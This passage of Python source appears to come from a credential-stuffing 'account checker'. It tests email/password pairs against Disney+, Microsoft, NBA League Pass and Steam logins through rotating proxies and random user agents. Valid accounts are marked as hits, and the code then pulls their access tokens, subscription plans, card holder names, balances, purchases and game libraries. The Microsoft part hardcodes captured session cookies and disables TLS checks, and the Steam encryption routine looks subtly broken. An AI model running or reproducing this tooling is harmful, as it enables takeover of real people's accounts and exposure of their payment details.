        body = {"operationName": "check", "variables": {"email": email}, "query": "query check($email: String!) { check(email: $email) { operations nextOperation } }"}
        r = sess.post(self.graphql_url, headers=headers, json=body, timeout=25)
        return r.text

    def _login(self, sess, ua, device_token, email, password):
        headers = {'accept': 'application/json', 'authorization': device_token, 'content-type': 'application/json', 'user-agent': ua, 'x-bamsdk-client-id': 'disney-svod-3d9324fc', 'x-bamsdk-platform': 'android/google/handset', 'x-bamsdk-version': '9.20.0'}
        body = {"query": self.login_query, "operationName": "login", "variables": {"input": {"email": email, "password": password}}}
        r = sess.post(self.graphql_url, headers=headers, json=body, timeout=25)
        return r.text

    def _subscribers(self, sess, ua, login_token):
        headers = {'authorization': f'Bearer {login_token}', 'content-type': 'application/json; charset=utf-8', 'origin': 'https://www.disneyplus.com', 'referer': 'https://www.disneyplus.com/', 'user-agent': ua, 'x-bamsdk-client-id': 'disney-svod-3d9324fc', 'x-bamsdk-platform': 'windows', 'x-bamsdk-version': '12.0'}
        r = sess.get(self.subscribers_url, headers=headers, timeout=25)
        return r.text

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {'email': email, 'password': password, 'status': 'FAIL', 'data': {}}
        proxy_str = self.proxy_manager.get_proxy() if self.proxy_manager else None
        session = requests.Session()
        if proxy_str: session.proxies = {"http": proxy_str, "https": proxy_str}
        ua = random.choice(self.ua_pool)
        try:
            device_token, dev_text = self._register_device(session, ua)
            if not device_token or 'forbidden-location' in dev_text.lower(): result['status'] = 'ERROR'; result['error'] = 'Device registration failed (geo-block?)'; return result
            check_text = self._check_email(session, ua, device_token, email)
            low = check_text.lower()
            if 'password-reset-required' in low: result['status'] = 'RESET'; result['error'] = 'Password reset required'; return result
            if any(k in check_text for k in ['"operations":["Register"', '"operations":["RegisterAccount"']): result['status'] = 'INVALID'; result['error'] = 'Email not registered'; return result
            if '403 error' in low or 'cloudfront' in low: result['status'] = 'ERROR'; result['error'] = 'Geo-blocked or IP banned'; return result
            login_text = self._login(session, ua, device_token, email, password)
            low = login_text.lower()
            if 'bad-credentials' in low or 'account is blocked' in low: result['status'] = 'INVALID'; result['error'] = 'Invalid credentials'; return result
            if 'password-reset-required' in low: result['status'] = 'RESET'; result['error'] = 'Password reset required'; return result
            if '{"data":{"login"' not in login_text and 'issubscriber":true' not in low: result['status'] = 'ERROR'; result['error'] = 'Login response invalid'; return result
            info = {}
            m = re.search(r'\{"accessToken":"(.*?)"', login_text)
            login_token = m.group(1) if m else ''
            info['access_token'] = login_token
            m = re.search(r'"geoIp":\{"country":"(.*?)"', login_text)
            info['country'] = m.group(1) if m else 'Unknown'
            m = re.search(r'"emailVerified":(.*?),', login_text)
            info['email_verified'] = m.group(1) if m else 'false'
            m = re.search(r'"isFreeTrial":(.*?)\},', login_text)
            info['free_trial'] = m.group(1) if m else 'false'
            m = re.search(r'"nextRenewalDate":"(.*?)T', login_text)
            info['expiry'] = m.group(1) if m else None
            m = re.search(r'"isSubscriber":(.*?),', login_text)
            info['is_subscriber'] = m.group(1) if m else 'false'
            profiles = re.findall(r'"name":"(.*?)"', login_text)
            info['profiles'] = profiles[:5] if profiles else []
            m = re.search(r',"earlyAccess":(.*?),', login_text)
            if m:
                gohan = m.group(1)
                m2 = re.search(re.escape(f'"earlyAccess":{gohan}') + r',"name":"(.*?)"', login_text)
                if m2:
                    info['plan'] = m2.group(1)
                    if 'hulu' in m2.group(1).lower(): info['hulu'] = True
            if not login_token: result['status'] = 'HIT'; result['data'] = info; return result
            sub_text = self._subscribers(session, ua, login_token)
            sub_low = sub_text.lower()
            if 'subscription.not.found' in sub_low or '"subscriberstatus":"churned"' in sub_low: result['status'] = 'FREE'; result['data'] = info; return result
            m = re.search(r'"subscriberStatus":"(.*?)"', sub_text)
            if m: info['subscriber_status'] = m.group(1)
            m = re.search(r'"billingCycle":"(.*?)"', sub_text)
            if m: info['billing_cycle'] = m.group(1)
            m = re.search(r'"name":"(.*?)"', sub_text)
            if m and not info.get('plan'): info['plan'] = m.group(1)
            m = re.search(r'"toDate":"(.*?)T', sub_text)
            if m: info['expiry'] = m.group(1)
            m = re.search(r'"paymentProvider":"(.*?)"', sub_text)
            if m: info['payment_provider'] = m.group(1)
            if info.get('expiry'):
                try:
                    exp = datetime.strptime(info['expiry'], '%Y-%m-%d').replace(tzinfo=timezone.utc)
                    info['remaining_days'] = (exp - datetime.now(timezone.utc)).days
                except: pass
            if info.get('subscriber_status', '').upper() == 'ACTIVE' or info.get('is_subscriber') == 'true': result['status'] = 'HIT'; result['data'] = info; return result
            if info.get('remaining_days') is not None and info['remaining_days'] < 0: result['status'] = 'FREE'; result['data'] = info; return result
            result['status'] = 'HIT'; result['data'] = info; return result
        except requests.exceptions.ProxyError: result['status'] = 'ERROR'; result['error'] = "Proxy error"; return result
        except requests.exceptions.Timeout: result['status'] = 'ERROR'; result['error'] = "Timeout"; return result
        except requests.exceptions.ConnectionError: result['status'] = 'ERROR'; result['error'] = "Connection failed"; return result
        except Exception as e: result['status'] = 'ERROR'; result['error'] = str(e)[:80]; return result

# ==================== Microsoft Rewards Checker ====================
def extract_between(text, left, right):
    try:
        match = re.search(f"{re.escape(left)}(.*?){re.escape(right)}", text, re.DOTALL)
        return match.group(1) if match else None
    except: return None

def request_with_retry(session, method, url, retry_counter, **kwargs):
    for attempt in range(3 + 1):
        try:
            response = session.request(method, url, timeout=20, **kwargs)
            return response
        except requests.exceptions.RequestException:
            if attempt < 3: retry_counter[0] += 1; time.sleep(1 + attempt); continue
            raise
    return None

class MicrosoftRewardsChecker:
    def __init__(self, proxy_manager: Optional[SmartProxyManager] = None):
        self.proxy_manager = proxy_manager

    def _get_proxy(self):
        if self.proxy_manager: return self.proxy_manager.get_proxy()
        return None

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {'status': 'ERROR', 'email': email, 'password': password, 'country': 'N/A', 'card_holder': 'N/A', 'balance': 'N/A', 'purchased_items': 'N/A', 'auto_renew': 'N/A', 'start_date': 'N/A', 'renewal_date': 'N/A', 'points': 'N/A', 'error': None}
        MICROSOFT_PPFT_TOKEN = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
        MICROSOFT_BK = "1665024852"
        MICROSOFT_UAID = "a5b22c26bc704002ac309462e8d061bb"
        for use_proxy in [True, False]:
            session = requests.Session()
            session.verify = False
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0'})
            if use_proxy:
                proxy_str = self._get_proxy()
                if proxy_str: session.proxies = {'http': proxy_str, 'https': proxy_str}
                else: continue
            retry_counter = [0]
            try:
                login_url = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={urllib.parse.quote(email)}&contextid=2CCDB02DC526CA71&bk={MICROSOFT_BK}&uaid={MICROSOFT_UAID}&pid=15216"
                login_payload = f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={MICROSOFT_PPFT_TOKEN}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login={urllib.parse.quote(email)}&loginfmt={urllib.parse.quote(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={urllib.parse.quote(password)}"
                login_headers = {"Host": "login.live.com", "Cache-Control": "max-age=0", "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"', "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"', "Upgrade-Insecure-Requests": "1", "Origin": "https://login.live.com", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid={MICROSOFT_UAID}&display=touch&username={urllib.parse.quote(email)}", "Accept-Language": "en-US,en;q=0.9", "Cookie": "CAW=%3CEncryptedData%20xmlns%3D%22http://www.w3.org/2001/04/xmlenc%23%22%20Id%3D%22BinaryDAToken1%22%20Type%3D%22http://www.w3.org/2001/04/xmlenc%23Element%22%3E%3CEncryptionMethod%20Algorithm%3D%22http://www.w3.org/2001/04/xmlenc%23tripledes-cbc%22%3E%3C/EncryptionMethod%3E%3Cds:KeyInfo%20xmlns:ds%3D%22http://www.w3.org/2000/09/xmldsig%23%22%3E%3Cds:KeyName%3Ehttp://Passport.NET/STS%3C/ds:KeyName%3E%3C/ds:KeyInfo%3E%3CCipherData%3E%3CCipherValue%3EM.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ%2BYNEFX7J4eX4arCa69y0j3ebxxB0ET0%2B8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on%2B9vOMIfZZIako5uD3VceGABh7ZxD%2BcwC0ksKgsXzQs9cJFZ%2BG1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA%3D%3D%3C/CipherValue%3E%3C/CipherData%3E%3C/EncryptedData%3E;DIDC=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;DIDCL=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89; OParams=11O.DlK9hYdFfivp*0QoJiYT2Qy83kFNo*ZZTQeuvQ0LQzYIADO3zbs*Hic1wfggJcJ6IjaSW0uhkJA2V2qHoF6Uijtl4S917NbRSYxGy0zbqEYtcXAlWZZCQUyVeRoEZT9xiChsk8JTXV2xPusIXRCRpyflM376GGcjUFMaQZuR6PPITnzwgJTeCj6iMAXKEyR5ougzXlltimdTufqAZLwLiC8a8U2ifLfQXP6ibI2Uk!8vBkegcZ73OpR2J2XPd0XeNEt7zVuUQnsbzmSKT3QetSepbGHhx*bkq8c0KyMZcq08dnJVvcPGwI2NNnN3hI1kytasvECwkKYbPIzVX*cA8jbyVqsQRoGWMTr7gGB4Z5BDteRuWO8tuVBRpn9spWtoBQv5CqOvPptW7kV0n1jrYxU$; MicrosoftApplicationsTelemetryDeviceId=49a10983-52d4-43ed-9a94-14ac360a5683; ai_session=K/6T8kGCWbit7HtaRqLso3|1716398680878|1716398680878; MSFPC=GUID=09547181a6984b52ad37278edb4b6ee6&HASH=0954&LV=202405&V=4&LU=1714868413949"}
                login_response = request_with_retry(session, 'POST', login_url, retry_counter, headers=login_headers, data=login_payload, allow_redirects=True)
                if not login_response:
                    if use_proxy: continue
                    else: result['error'] = "No login response"; return result
                response_text = login_response.text
                response_url = login_response.url
                if "Your account or password is incorrect." in response_text or "That Microsoft account doesn\\'t exist." in response_text or ("Sign in to your Microsoft account" in response_text and "oauth20_desktop.srf#access_token=" not in response_url):
                    result['status'] = 'BAD'; result['error'] = "Invalid credentials"; return result
                if "account.live.com/recover" in response_text or "account.live.com/identity/confirm" in response_text or "Email/Confirm" in response_text:
                    result['status'] = '2FA'; result['error'] = "2FA required"; return result
                if "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
                    result['status'] = 'BANNED'; result['error'] = "Account locked or banned"; return result
                oauth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none"
                oauth_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Referer": "https://account.microsoft.com/"}
                oauth_response = request_with_retry(session, 'GET', oauth_url, retry_counter, headers=oauth_headers, allow_redirects=True)
                if not oauth_response:
                    if use_proxy: continue
                    else: result['error'] = "OAuth failed"; return result
                token = None
                if "access_token=" in oauth_response.url:
                    token = extract_between(oauth_response.url, "access_token=", "&token_type")
                if not token:
                    if use_proxy: continue
                    else: result['error'] = "Token extraction failed"; return result
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                payment_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.9", "Authorization": f'MSADELEGATE1.0="{token}"', "Content-Type": "application/json", "Host": "paymentinstruments.mp.microsoft.com", "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"}
                payment_response = request_with_retry(session, 'GET', payment_url, retry_counter, headers=payment_headers)
                if not payment_response or payment_response.status_code != 200:
                    if use_proxy: continue
                    else: result['error'] = "Payment API failed"; return result
                payment_data = payment_response.text
                balance = extract_between(payment_data, 'balance":', ',"') or "N/A"
                if balance != "N/A":
                    try:
                        balance_val = float(balance)
                        result['balance'] = f"${balance_val:.2f}"
                    except: result['balance'] = balance
                else: result['balance'] = "$0.0"
                card_holder = extract_between(payment_data, 'accountHolderName":"', '","') or "No CC Linked"
                transaction_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                transaction_response = request_with_retry(session, 'GET', transaction_url, retry_counter, headers=payment_headers)
                country = "N/A"; purchased_item = "N/A"; auto_renew = "N/A"; start_date = "N/A"; renewal_date = "N/A"
                if transaction_response and transaction_response.status_code == 200:
                    trans_data = transaction_response.text
                    country = extract_between(trans_data, 'country":"', '"}') or "N/A"
                    purchased_item = extract_between(trans_data, 'title":"', '",') or "N/A"
                    auto_renew_raw = extract_between(trans_data, '"autoRenew":', ',')
                    if auto_renew_raw: auto_renew = "Yes" if auto_renew_raw.lower() == "true" else "No"
                    start_date = extract_between(trans_data, '"startDate":"', 'T') or "N/A"
                    renewal_date = extract_between(trans_data, '"nextRenewalDate":"', 'T') or "N/A"
                points = "N/A"
                try:
                    rewards_response = session.get("https://rewards.bing.com/", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/80.0.3987.149 Safari/537.36"}, timeout=20)
                    if rewards_response.status_code == 200:
                        rewards_data = rewards_response.text
                        points_match = re.search(r',"availablePoints":(\d+),', rewards_data)
                        if points_match: points = points_match.group(1)
                except: pass
                result['status'] = 'HIT'
                result['country'] = country
                result['card_holder'] = card_holder
                result['purchased_items'] = purchased_item if purchased_item != "N/A" else "None"
                result['auto_renew'] = auto_renew
                result['start_date'] = start_date
                result['renewal_date'] = renewal_date
                result['points'] = points
                return result
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                if use_proxy: continue
                else: result['error'] = f"Network error: {str(e)[:50]}"; return result
            except Exception as e: result['error'] = f"Unexpected error: {str(e)[:50]}"; return result
        result['error'] = "All attempts failed"
        return result

# ==================== NBA League Pass Checker ====================
class NBAChecker:
    def __init__(self, proxy_manager: Optional[SmartProxyManager] = None):
        self.proxy_manager = proxy_manager

    def _get_proxy(self):
        if self.proxy_manager: return self.proxy_manager.get_proxy()
        return None

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {'status': 'ERROR', 'email': email, 'password': password, 'displayname': 'N/A', 'end_date': 'N/A', 'country': 'N/A', 'renewal': 'N/A', 'error': None}
        payload = {"email": email, "password": password, "rememberMe": False}
        headers = {'Host': 'identity.nba.com', 'Sec-Ch-Ua': '"Chromium";v="121", "Not A(Brand";v="99"', 'Content-Type': 'application/json', 'Sec-Ch-Ua-Mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36', 'X-Client-Platform': 'web', 'Sec-Ch-Ua-Platform': '"Linux"', 'Accept': '*/*', 'Origin': 'https://www.nba.com', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.nba.com/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8', 'Connection': 'close'}
        session = requests.Session()
        proxy_str = self._get_proxy()
        if proxy_str: session.proxies = {'http': proxy_str, 'https': proxy_str}
        try:
            response = session.post("https://identity.nba.com/api/v1/auth", json=payload, headers=headers, timeout=15)
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get("status") == "success" and "data" in resp_json:
                    data = resp_json["data"]
                    user = data.get("user", {})
                    if "League Pass" in response.text:
                        subs = data.get("subscriptions", {})
                        account_messages = subs.get("AccountServiceMessage", [])
                        if account_messages:
                            msg = account_messages[0]
                            end_value = msg.get("formattedValidityEndDateWithTZ")
                            displayname = msg.get("displayName")
                            country = msg.get("orderCountry")
                            renewal = msg.get("isRenewal")
                            result['status'] = 'HIT'
                            result['displayname'] = displayname or 'N/A'
                            result['end_date'] = end_value or 'N/A'
                            result['country'] = country or 'N/A'
                            result['renewal'] = "Yes" if renewal else "No"
                            return result
                        else: result['status'] = 'FREE'; return result
                    else: result['status'] = 'FREE'; return result
                else: result['status'] = 'BAD'; result['error'] = "Invalid credentials"; return result
            else: result['status'] = 'ERROR'; result['error'] = f"HTTP {response.status_code}"; return result
        except requests.exceptions.ProxyError: result['error'] = "Proxy error"; return result
        except requests.exceptions.RequestException as e: result['error'] = f"Network error: {str(e)[:50]}"; return result
        except Exception as e: result['error'] = f"Unexpected error: {str(e)[:50]}"; return result

# ==================== Steam Checker ====================
class SteamChecker:
    def __init__(self, proxy_manager: Optional[SmartProxyManager] = None):
        self.proxy_manager = proxy_manager
        self._ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        self._login_page = "https://store.steampowered.com/login/"
        self._rsa_url = "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/"
        self._begin_url = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/"
        self._poll_url = "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/"
        self._games_url = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/"
        self._level_url = "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/"
        self._summary_url = "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/"
        self._bans_url = "https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/"
        self._notable_games = {730: "CS2", 570: "Dota 2", 440: "TF2", 578080: "PUBG", 252490: "Rust", 1172470: "Apex Legends", 1245620: "Elden Ring", 1091500: "Cyberpunk 2077", 292030: "The Witcher 3", 1938090: "Call of Duty HQ", 359550: "Rainbow Six Siege", 381210: "Dead by Daylight", 311210: "Call of Duty: Black Ops III", 218620: "PAYDAY 2", 346110: "ARK", 413150: "Stardew Valley", 49520: "Borderlands 2", 105600: "Terraria", 400: "Portal", 620: "Portal 2"}
        self._er_ok = 1; self._er_bad = 5; self._er_notfound = 18; self._er_rate = 84; self._max_poll = 3

    def _get_session(self) -> requests.Session:
        sess = requests.Session()
        sess.headers.update({"User-Agent": self._ua, "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.9", "Origin": "https://store.steampowered.com", "Referer": "https://store.steampowered.com/login/"})
        try: sess.get(self._login_page, timeout=10)
        except: pass
        return sess

    def _rsa_encrypt(self, password: str, mod_hex: str, exp_hex: str) -> str:
        mod = int(mod_hex, 16)
        exp = int(exp_hex, 16)
        key_len = (mod.bit_length() + 7) // 8
        msg = password.encode("utf-8")
        if len(msg) > key_len - 11: raise ValueError("Password too long for RSA key size")
        pad_len = key_len - len(msg) - 3
        ps = bytearray()
        while len(ps) < pad_len: ps.extend(b for b in os.urandom(pad_len * 2) if b != 0)
        ps = bytes(ps[:pad_len])
        em = b"\x00\x02" + ps + b"\x00" + msg
        c = pow(int.from_bytes(em, "big"), mod, exp)
        return base64.b64encode(c.to_bytes(key_len, "big")).decode("ascii")

    def _post_json(self, sess, url: str, data: dict, timeout: int = 20) -> Tuple[int, dict]:
        try:
            resp = sess.post(url, data=data, timeout=timeout)
            return resp.status_code, resp.json()
        except Exception as e: return 0, {"_exc": str(e)}

    def _get_json(self, sess, url: str, params: dict, timeout: int = 20) -> Tuple[int, dict]:
        try:
            resp = sess.get(url, params=params, timeout=timeout)
            return resp.status_code, resp.json()
        except Exception as e: return 0, {"_exc": str(e)}

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {'email': email, 'password': password, 'status': 'ERROR', 'steamid': '', 'persona': 'N/A', 'country': 'N/A', 'level': -1, 'game_count': -1, 'games_list': [], 'notable': [], 'vac_bans': 0, 'trade_ban': 'False', 'limited': 'False', 'guard': 'None', 'has_value': False, 'plan': '', 'reason': None}
        proxy_str = self.proxy_manager.get_proxy() if self.proxy_manager else None
        proxies = {'http': proxy_str, 'https': proxy_str} if proxy_str else None
        sess = self._get_session()
        if proxies: sess.proxies = proxies
        try:
            s, rsa_data = self._get_json(sess, self._rsa_url, {"account_name": email}, timeout=20)
            rsa = rsa_data.get("response", {})
            if s != 200 or not rsa.get("publickey_mod"): result['reason'] = f"RSA key failed (HTTP {s})"; return result
            try: enc_pass = self._rsa_encrypt(password, rsa["publickey_mod"], rsa["publickey_exp"])
            except Exception as e: result['reason'] = f"RSA encrypt: {e}"; return result
            s, begin = self._post_json(sess, self._begin_url, {"account_name": email, "encrypted_password": enc_pass, "encryption_timestamp": rsa["timestamp"], "remember_login": "true", "persistence": "1", "website_id": "Store"}, timeout=20)
            resp = begin.get("response", {})
            eresult = resp.get("eresult", 0)
            if eresult in (self._er_bad, self._er_notfound) or s == 401: result['status'] = 'BAD'; return result
            if eresult == self._er_rate: result['reason'] = "rate-limited"; return result
            if "interval" in resp and not resp.get("extended_error_message"):
                guard_type = "Unknown"
                confirmations = resp.get("allowed_confirmations") or []
                guard_types = {int(c.get("confirmation_type", 0)) for c in confirmations}
                if 3 in guard_types or 4 in guard_types: guard_type = "Mobile"
                elif 2 in guard_types: guard_type = "Email"
                result['status'] = 'HIT'; result['guard'] = guard_type; result['steamid'] = resp.get("steamid", ""); result['plan'] = f"Guard = {guard_type} | Steam Guard required (valid creds)"; return result
            client_id = resp.get("client_id")
            request_id = resp.get("request_id")
            if not client_id: result['reason'] = f"BeginAuth missing client_id: {resp.get('error_message', '')}"; return result
            steamid = str(resp.get("steamid", ""))
            confirmations = resp.get("allowed_confirmations") or []
            guard_types = {int(c.get("confirmation_type", 0)) for c in confirmations}
            if 3 in guard_types or 4 in guard_types: guard_label = "Mobile"
            elif 2 in guard_types: guard_label = "Email"
            else: guard_label = "None"
            if guard_label != "None":
                result['status'] = 'HIT'; result['steamid'] = steamid; result['guard'] = guard_label; result['plan'] = f"Guard = {guard_label} | Steam Guard required (valid creds)"; return result
            access_token = None
            for _ in range(self._max_poll):
                s, poll = self._post_json(sess, self._poll_url, {"client_id": client_id, "request_id": request_id}, timeout=20)
                pr = poll.get("response", {})
                if pr.get("access_token"): access_token = pr["access_token"]; break
                time.sleep(2)
            if not access_token: result['reason'] = "poll: no access_token"; return result
            s, games_data = self._get_json(sess, self._games_url, {"access_token": access_token, "steamid": steamid, "include_appinfo": "true", "include_played_free_games": "false"}, timeout=20)
            games_list = []; game_count = -1
            if s == 200:
                resp_games = games_data.get("response", {})
                game_count = resp_games.get("game_count", 0)
                for g in resp_games.get("games") or []: games_list.append({"appid": g.get("appid", 0), "name": g.get("name", f"AppID {g.get('appid', '?')}"), "playtime": g.get("playtime_forever", 0)})
                games_list.sort(key=lambda x: x["playtime"], reverse=True)
            s, level_data = self._get_json(sess, self._level_url, {"access_token": access_token, "steamid": steamid}, timeout=20)
            level = -1
            if s == 200: level = (level_data.get("response", {})).get("player_level", 0)
